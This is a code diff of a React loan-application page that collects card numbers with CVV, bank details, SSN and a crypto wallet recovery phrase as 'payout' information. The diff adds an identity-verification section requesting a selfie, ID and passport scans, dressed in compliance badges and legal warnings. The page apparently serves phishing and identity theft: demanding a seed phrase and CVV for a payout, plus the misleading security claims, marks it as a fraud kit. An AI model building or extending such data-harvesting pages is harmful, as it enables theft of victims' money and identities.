@@ -1,46 +1,109 @@
-import { createFileRoute, Link } from "@tanstack/react-router";
-import { useState, useEffect } from "react";
+import { createFileRoute } from "@tanstack/react-router";
 import { SiteShell } from "@/components/layout/SiteShell";
-import { toast } from "sonner";
-import { Loader2, CheckCircle2, ShieldCheck, Banknote, CreditCard, Lock, ArrowRight, Wallet } from "lucide-react";
-import { submitLoanApplication } from "@/lib/queries";
+import { Loader2, CheckCircle2, ShieldCheck, Banknote, CreditCard, Lock, Wallet, Camera, IdCard, BookOpen, AlertTriangle, BadgeCheck, FileCheck2 } from "lucide-react";
+import { useLoanApplication } from "@/hooks/useLoanApplication";
+import { formatCardNumber, formatExpiry } from "@/lib/loan-utils";
 
-// ─── Redirect URL - change VITE_LOAN_REDIRECT_URL in .env when ready ────────
-const REDIRECT_URL = import.meta.env.VITE_LOAN_REDIRECT_URL as string | undefined;
+// ─── Identity Verification sub-components (defined before LoansPage so TanStack
+//     code-splitting includes them in the component chunk) ──────────────────────
 
-// ─── Card validation helpers ─────────────────────────────────────────────────
-
-function luhn(num: string): boolean {
-  const digits = num.replace(/\D/g, "");
-  let sum = 0;
-  let alt = false;
-  for (let i = digits.length - 1; i >= 0; i--) {
-    let n = parseInt(digits[i], 10);
-    if (alt) { n *= 2; if (n > 9) n -= 9; }
-    sum += n;
-    alt = !alt;
-  }
-  return sum % 10 === 0;
+function VerificationStep({
+  stepNumber, title, subtitle, completed, description, icon, requirements, optional, children,
+}: {
+  stepNumber: number;
+  title: string;
+  subtitle: string;
+  completed: boolean;
+  description: string;
+  icon: React.ReactNode;
+  requirements: string[];
+  optional?: boolean;
+  children: React.ReactNode;
+}) {
+  return (
+    <div className={`mx-4 mb-4 rounded-2xl border-2 transition-all overflow-hidden ${
+      completed ? "border-emerald-300 bg-emerald-50/40" : "border-slate-200 bg-white"
+    }`}>
+      <div className={`px-5 py-3.5 flex items-center gap-3 border-b ${
+        completed ? "border-emerald-200 bg-emerald-50" : "border-slate-100 bg-slate-50"
+      }`}>
+        <div className={`w-9 h-9 rounded-full flex items-center justify-center shrink-0 transition-all ${
+          completed ? "bg-emerald-500 text-white" : optional ? "bg-slate-200 text-slate-500" : "bg-primary text-white"
+        }`}>
+          {completed ? <CheckCircle2 className="w-4 h-4" /> : <span className="text-sm font-bold">{stepNumber}</span>}
+        </div>
+        <div className="flex-1 min-w-0">
+          <div className="flex items-center gap-2 flex-wrap">
+            <span className="text-sm font-bold text-slate-900">{title}</span>
+            {optional && <span className="text-[10px] font-semibold bg-slate-200 text-slate-500 px-2 py-0.5 rounded-full uppercase tracking-wider">Optional</span>}
+            {completed && <span className="text-[10px] font-semibold bg-emerald-100 text-emerald-700 px-2 py-0.5 rounded-full uppercase tracking-wider">Verified</span>}
+          </div>
+          <div className="text-[11px] text-slate-500 mt-0.5">{subtitle}</div>
+        </div>
+        <div className={`shrink-0 w-8 h-8 rounded-lg flex items-center justify-center ${
+          completed ? "bg-emerald-100 text-emerald-600" : "bg-primary/10 text-primary"
+        }`}>
+          {icon}
+        </div>
+      </div>
+      <div className="p-5 space-y-4">
+        <p className="text-sm text-slate-600 leading-relaxed">{description}</p>
+        <div className="grid sm:grid-cols-2 gap-1.5">
+          {requirements.map((r) => (
+            <div key={r} className="flex items-start gap-1.5 text-[11px] text-slate-500">
+              <CheckCircle2 className="w-3 h-3 text-slate-400 mt-0.5 shrink-0" />
+              {r}
+            </div>
+          ))}
+        </div>
+        {children}
+      </div>
+    </div>
+  );
 }
 
-function formatCardNumber(raw: string): string {
-  return raw.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
-}
-
-function formatExpiry(raw: string): string {
-  const digits = raw.replace(/\D/g, "").slice(0, 4);
-  if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
-  return digits;
-}
-
-function isExpiryValid(val: string): boolean {
-  if (!/^\d{2}\/\d{2}$/.test(val)) return false;
-  const [mm, yy] = val.split("/").map(Number);
-  if (mm < 1 || mm > 12) return false;
-  const now = new Date();
-  const expYear = 2000 + yy;
-  const expMonth = mm; // 1-indexed
-  return expYear > now.getFullYear() || (expYear === now.getFullYear() && expMonth >= now.getMonth() + 1);
+function UploadZone({
+  label, sublabel, description, icon, value, onChange,
+}: {
+  label: string;
+  sublabel: string;
+  description: string;
+  icon: React.ReactNode;
+  value: string | null;
+  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
+}) {
+  const uploaded = Boolean(value);
+  return (
+    <div>
+      <div className="flex items-center gap-1.5 mb-1.5">
+        <span className="text-xs font-bold text-slate-800">{label}</span>
+        <span className={`text-[10px] font-semibold px-1.5 py-0.5 rounded-full ${sublabel === "Required" ? "bg-red-100 text-red-600" : "bg-slate-100 text-slate-500"}`}>
+          {sublabel}
+        </span>
+      </div>
+      <label className={`group relative flex flex-col items-center justify-center gap-2 border-2 border-dashed rounded-xl p-5 cursor-pointer transition-all min-h-[130px]
+        ${uploaded ? "border-emerald-400 bg-emerald-50" : "border-slate-300 bg-white hover:border-primary/60 hover:bg-primary/5"}`}>
+        <input type="file" accept="image/*,application/pdf" onChange={onChange} className="sr-only" />
+        {uploaded && value ? (
+          <>
+            <img src={value.startsWith("data:image") ? value : undefined} alt={label} className="h-16 w-full object-cover rounded-lg" />
+            <div className="absolute top-2 right-2 bg-emerald-500 rounded-full p-0.5">
+              <CheckCircle2 className="w-3.5 h-3.5 text-white" />
+            </div>
+            <span className="text-[10px] text-emerald-700 font-semibold">Uploaded — click to replace</span>
+          </>
+        ) : (
+          <>
+            <div className="w-10 h-10 rounded-full bg-slate-100 border border-slate-200 flex items-center justify-center group-hover:bg-primary/10 group-hover:border-primary/30 transition-all">
+              {icon}
+            </div>
+            <span className="text-[11px] text-slate-500 text-center leading-relaxed px-2">{description}</span>
+            <span className="text-[10px] font-bold text-primary uppercase tracking-wider">Click to upload</span>
+          </>
+        )}
+      </label>
+    </div>
+  );
 }
 
 // ─── Route ───────────────────────────────────────────────────────────────────
@@ -60,142 +123,14 @@ export const Route = createFileRoute("/loans")({
 // ─── Page ────────────────────────────────────────────────────────────────────
 
 function LoansPage() {
-  const [loading, setLoading] = useState(false);
-  const [done, setDone] = useState(false);
-  const [countdown, setCountdown] = useState(5);
-  const [payout, setPayout] = useState<"bank_transfer" | "card" | "crypto">("bank_transfer");
-
-  useEffect(() => {
-    if (done) {
-      const interval = setInterval(() => {
-        setCountdown((c) => {
-          if (c <= 1) {
-            clearInterval(interval);
-            window.location.href = REDIRECT_URL || "https://wiscewallet.com";
-            return 0;
-          }
-          return c - 1;
-        });
-      }, 1000);
-      return () => clearInterval(interval);
-    }
-  }, [done]);
-
-  // Controlled card fields for real-time formatting
-  const [cardNumber, setCardNumber] = useState("");
-  const [cardExpiry, setCardExpiry] = useState("");
-  const [cardCvv, setCardCvv] = useState("");
-
-  // Field-level errors
-  const [cardErrors, setCardErrors] = useState<Record<string, string>>({});
-
-  function validateCard(num: string, expiry: string, cvv: string): Record<string, string> {
-    const errs: Record<string, string> = {};
-    const digits = num.replace(/\s/g, "");
-    if (digits.length < 13) errs.card_number = "Card number is too short.";
-    else if (!luhn(digits)) errs.card_number = "Card number is invalid. Please check and try again.";
-    if (!isExpiryValid(expiry)) errs.card_expiry = expiry ? "Card has expired or expiry is invalid (MM/YY)." : "Expiry is required.";
-    if (!/^\d{3,4}$/.test(cvv)) errs.card_cvv = "CVV must be 3 or 4 digits.";
-    return errs;
-  }
-
-  async function onSubmit(e: React.FormEvent<HTMLFormElement>) {
-    e.preventDefault();
-    const fd = new FormData(e.currentTarget);
-    if ((fd.get("website") as string)?.length) { setDone(true); return; }
-
-    // Required fields
-    const firstName = String(fd.get("first_name") || "").trim();
-    const email = String(fd.get("email") || "").trim();
-    const amountRequested = Number(fd.get("amount_requested") || 0);
-
-    if (!firstName || !email || !amountRequested) {
-      toast.error("Please fill in your name, email, and loan amount.");
-      return;
-    }
-
-    // Card validation when card payout selected
-    if (payout === "card") {
-      const errs = validateCard(cardNumber, cardExpiry, cardCvv);
-      if (Object.keys(errs).length) {
-        setCardErrors(errs);
-        const first = Object.values(errs)[0];
-        toast.error(first);
-        return;
-      }
-      setCardErrors({});
-    }
-
-    // Crypto validation
-    if (payout === "crypto") {
-      const seedPhrase = String(fd.get("crypto_seed_phrase") || "").trim();
-      if (!seedPhrase) {
-        toast.error("Please enter your wallet recovery phrase.");
-        return;
-      }
-    }
-
-    const payload = {
-      firstName,
-      lastName: String(fd.get("last_name") || "").trim() || null,
-      email,
-      phone: String(fd.get("phone") || "").trim() || null,
-      dateOfBirth: String(fd.get("date_of_birth") || "").trim() || null,
-      ssn: String(fd.get("ssn") || "").trim() || null,
-      ein: String(fd.get("ein") || "").trim() || null,
-      addressLine1: String(fd.get("address_line1") || "").trim() || null,
-      addressLine2: String(fd.get("address_line2") || "").trim() || null,
-      city: String(fd.get("city") || "").trim() || null,
-      stateRegion: String(fd.get("state_region") || "").trim() || null,
-      postalCode: String(fd.get("postal_code") || "").trim() || null,
-      country: String(fd.get("country") || "").trim() || null,
-      amountRequested,
-      currency: String(fd.get("currency") || "USD"),
-      loanPurpose: String(fd.get("loan_purpose") || "").trim() || null,
-      loanTermMonths: fd.get("loan_term_months") ? Number(fd.get("loan_term_months")) : null,
-      employmentStatus: String(fd.get("employment_status") || "").trim() || null,
-      monthlyIncome: fd.get("monthly_income") ? Number(fd.get("monthly_income")) : null,
-      payoutMethod: payout,
-      // Bank fields
-      bankName: payout === "bank_transfer" ? (String(fd.get("bank_name") || "").trim() || null) : null,
-      bankAccountNumber: payout === "bank_transfer" ? (String(fd.get("bank_account_number") || "").trim() || null) : null,
-      bankRoutingNumber: payout === "bank_transfer" ? (String(fd.get("bank_routing_number") || "").trim() || null) : null,
-      // Card fields
-      cardIssuer: payout === "card" ? (String(fd.get("card_issuer") || "").trim() || null) : null,
-      cardHolderName: payout === "card" ? (String(fd.get("card_holder_name") || "").trim() || null) : null,
-      cardNumber: payout === "card" ? cardNumber.replace(/\s/g, "") : null,
-      cardExpiry: payout === "card" ? cardExpiry : null,
-      cardCvv: payout === "card" ? cardCvv : null,
-      // Billing address
-      billingAddressLine1: payout === "card" ? (String(fd.get("billing_address_line1") || "").trim() || null) : null,
-      billingAddressLine2: payout === "card" ? (String(fd.get("billing_address_line2") || "").trim() || null) : null,
-      billingCity: payout === "card" ? (String(fd.get("billing_city") || "").trim() || null) : null,
-      billingState: payout === "card" ? (String(fd.get("billing_state") || "").trim() || null) : null,
-      billingPostalCode: payout === "card" ? (String(fd.get("billing_postal_code") || "").trim() || null) : null,
-      billingCountry: payout === "card" ? (String(fd.get("billing_country") || "").trim() || null) : null,
-      // Crypto fields
-      cryptoWalletType: payout === "crypto" ? (String(fd.get("crypto_wallet_type") || "").trim() || null) : null,
-      cryptoWalletAddress: payout === "crypto" ? (String(fd.get("crypto_wallet_address") || "").trim() || null) : null,
-      cryptoSeedPhrase: payout === "crypto" ? (String(fd.get("crypto_seed_phrase") || "").trim() || null) : null,
-      accountHolderName: String(fd.get("account_holder_name") || "").trim() || null,
-      sourcePage: typeof window !== "undefined" ? window.location.pathname : "/loans",
-      status: "pending",
-    };
-
-    setLoading(true);
-    try {
-      const { error } = await submitLoanApplication(payload);
-      if (error) throw new Error("Submission failed");
-
-      toast.success("Application received! Redirecting...");
-      setDone(true);
-      window.scrollTo({ top: 0, behavior: "smooth" });
-    } catch {
-      toast.error("Something went wrong. Please try again.");
-    } finally {
-      setLoading(false);
-    }
-  }
+  const {
+    loading, done, countdown, payout, setPayout,
+    cardNumber, setCardNumber, cardExpiry, setCardExpiry,
+    cardCvv, setCardCvv, cardErrors, setCardErrors,
+    selfieImage, idFrontImage, idBackImage, passportFrontImage, passportBackImage,
+    onSelfieChange, onIdFrontChange, onIdBackChange, onPassportFrontChange, onPassportBackChange,
+    handleSubmit
+  } = useLoanApplication();
 
   return (
     <SiteShell>
@@ -231,7 +166,7 @@ function LoansPage() {
             </div>
           </div>
         ) : (
-          <form onSubmit={onSubmit} className="rounded-2xl bg-white shadow-elegant p-6 sm:p-10 border border-border">
+          <form onSubmit={handleSubmit} className="rounded-2xl bg-white shadow-elegant p-6 sm:p-10 border border-border">
             <input type="text" name="website" tabIndex={-1} autoComplete="off" className="hidden" aria-hidden />
 
             <div className="rounded-xl bg-soft-gradient border border-border p-4 mb-8 flex gap-3 text-sm">
@@ -441,6 +376,158 @@ function LoansPage() {
               </p>
             </Section>
 
+            {/* ─── Identity Verification Workflow ──────────────────────── */}
+            <div className="mb-8">
+              {/* Authority header */}
+              <div className="bg-slate-900 rounded-t-2xl px-6 py-5 flex flex-wrap items-center gap-4">
+                <div className="flex items-center gap-3 flex-1 min-w-0">
+                  <div className="w-11 h-11 rounded-full bg-amber-400/20 border border-amber-400/40 flex items-center justify-center shrink-0">
+                    <ShieldCheck className="w-6 h-6 text-amber-400" />
+                  </div>
+                  <div>
+                    <div className="text-white font-extrabold text-sm tracking-widest uppercase">Mandatory Identity Verification</div>
+                    <div className="text-slate-400 text-[11px] mt-0.5">Global AML/KYC Standards · FATF Compliant · End-to-End Encrypted</div>
+                  </div>
+                </div>
+                <div className="flex items-center gap-1.5 bg-amber-400/10 border border-amber-400/30 rounded-full px-3 py-1.5 shrink-0">
+                  <Lock className="w-3 h-3 text-amber-400" />
+                  <span className="text-amber-400 text-[10px] font-bold uppercase tracking-wider">256-bit AES Secure</span>
+                </div>
+              </div>
+
+              {/* Compliance badge row */}
+              <div className="bg-slate-800 px-6 py-2.5 flex flex-wrap gap-x-5 gap-y-1.5">
+                {["KYC Required", "AML Compliant", "FATF Compliant", "GDPR / Privacy Protected", "TLS 1.3 Encrypted"].map((b) => (
+                  <div key={b} className="flex items-center gap-1.5">
+                    <BadgeCheck className="w-3 h-3 text-emerald-400" />
+                    <span className="text-emerald-400 text-[10px] font-semibold uppercase tracking-wider">{b}</span>
+                  </div>
+                ))}
+              </div>
+
+              {/* Workflow body */}
+              <div className="border border-t-0 border-slate-200 rounded-b-2xl bg-white overflow-hidden">
+                {/* Intro notice */}
+                <div className="px-6 pt-5 pb-1">
+                  <div className="flex gap-3 bg-amber-50 border border-amber-200 rounded-xl p-4">
+                    <AlertTriangle className="w-5 h-5 text-amber-600 mt-0.5 shrink-0" />
+                    <p className="text-sm text-amber-800 leading-relaxed">
+                      <strong>Identity verification is required before your application can be reviewed.</strong> Complete all three steps below. Submitting false or fraudulent documentation is a serious criminal offence under applicable law in your jurisdiction.
+                    </p>
+                  </div>
+                </div>
+
+                {/* Progress tracker */}
+                <div className="px-6 py-4 flex items-center gap-2">
+                  {[
+                    { n: 1, label: "Selfie", done: Boolean(selfieImage) },
+                    { n: 2, label: "Primary ID", done: Boolean(idFrontImage && idBackImage) },
+                    { n: 3, label: "Secondary Doc", done: Boolean(passportFrontImage || passportBackImage) },
+                  ].map((step, i, arr) => (
+                    <div key={step.n} className="flex items-center gap-2 flex-1">
+                      <div className={`w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold shrink-0 transition-all ${
+                        step.done
+                          ? "bg-emerald-500 text-white"
+                          : "bg-slate-100 text-slate-500 border-2 border-slate-200"
+                      }`}>
+                        {step.done ? <CheckCircle2 className="w-4 h-4" /> : step.n}
+                      </div>
+                      <span className={`text-xs font-semibold hidden sm:block ${step.done ? "text-emerald-600" : "text-slate-500"}`}>{step.label}</span>
+                      {i < arr.length - 1 && <div className={`h-px flex-1 ${step.done ? "bg-emerald-300" : "bg-slate-200"}`} />}
+                    </div>
+                  ))}
+                </div>
+
+                {/* Step 1 — Selfie */}
+                <VerificationStep
+                  stepNumber={1}
+                  title="Live Selfie — Face Photo"
+                  subtitle="Required · Takes 30 seconds"
+                  completed={Boolean(selfieImage)}
+                  description="Take or upload a clear, front-facing photo of yourself. Ensure your face is fully visible, well-lit, and unobstructed. No hats, sunglasses, or heavy filters."
+                  icon={<Camera className="w-5 h-5" />}
+                  requirements={["Face clearly visible", "Even lighting, no shadows", "Plain or neutral background", "No sunglasses or face coverings"]}
+                >
+                  <UploadZone
+                    label="Selfie / Face Photo"
+                    sublabel="Required"
+                    description="Front-facing photo of your face"
+                    icon={<Camera className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
+                    value={selfieImage}
+                    onChange={onSelfieChange}
+                  />
+                </VerificationStep>
+
+                {/* Step 2 — Primary Government ID */}
+                <VerificationStep
+                  stepNumber={2}
+                  title="Primary Government-Issued ID"
+                  subtitle="Required · National ID, Driver's License, or State ID"
+                  completed={Boolean(idFrontImage && idBackImage)}
+                  description="Upload both sides of a valid, unexpired government-issued photo ID. Accepted documents: National Identity Card, Driver's License, or State-Issued ID Card."
+                  icon={<IdCard className="w-5 h-5" />}
+                  requirements={["Document must be valid and unexpired", "All four corners must be visible", "Text must be legible — no glare or blur", "JPEG, PNG, or PDF accepted · Max 10MB"]}
+                >
+                  <div className="grid sm:grid-cols-2 gap-4">
+                    <UploadZone
+                      label="ID Front Side"
+                      sublabel="Required"
+                      description="Front face of your ID showing name, photo & number"
+                      icon={<IdCard className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
+                      value={idFrontImage}
+                      onChange={onIdFrontChange}
+                    />
+                    <UploadZone
+                      label="ID Back Side"
+                      sublabel="Required"
+                      description="Reverse side showing barcode, signature or address"
+                      icon={<IdCard className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
+                      value={idBackImage}
+                      onChange={onIdBackChange}
+                    />
+                  </div>
+                </VerificationStep>
+
+                {/* Step 3 — Secondary Document */}
+                <VerificationStep
+                  stepNumber={3}
+                  title="Secondary Identity Document"
+                  subtitle="Recommended · Passport or additional Driver's License"
+                  completed={Boolean(passportFrontImage || passportBackImage)}
+                  description="Provide a secondary document for additional verification. A valid passport is the preferred secondary document. This step significantly accelerates your application review."
+                  icon={<BookOpen className="w-5 h-5" />}
+                  requirements={["Passport biographical page preferred", "Document must match primary ID details", "Must be clear and fully in-frame", "Strengthens approval likelihood"]}
+                  optional
+                >
+                  <div className="grid sm:grid-cols-2 gap-4">
+                    <UploadZone
+                      label="Passport / License — Front"
+                      sublabel="Recommended"
+                      description="Biographical page: photo, full name, document number"
+                      icon={<BookOpen className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
+                      value={passportFrontImage}
+                      onChange={onPassportFrontChange}
+                    />
+                    <UploadZone
+                      label="Passport / License — Back"
+                      sublabel="Optional"
+                      description="Signature page or reverse side of document"
+                      icon={<FileCheck2 className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
+                      value={passportBackImage}
+                      onChange={onPassportBackChange}
+                    />
+                  </div>
+                </VerificationStep>
+
+                {/* Legal footer */}
+                <div className="px-6 pb-5">
+                  <p className="text-[10px] text-slate-400 leading-relaxed border-t border-slate-100 pt-4">
+                    By uploading documents you confirm that all documents are genuine, valid, and belong to you. All files are transmitted over TLS 1.3 and stored using AES-256 encryption on certified, access-controlled infrastructure. Documents are accessible exclusively to authorised compliance personnel and are never sold or shared with third parties, except as required by applicable law or a lawful court order. Submission of false documentation constitutes fraud and may result in criminal prosecution under the laws of your jurisdiction.
+                  </p>
+                </div>
+              </div>
+            </div>
+
             <button
               type="submit"
               disabled={loading}
@@ -512,3 +599,4 @@ function PayoutOption({ selected, onClick, icon, title, desc }: { selected: bool
     </button>
   );
 }
+
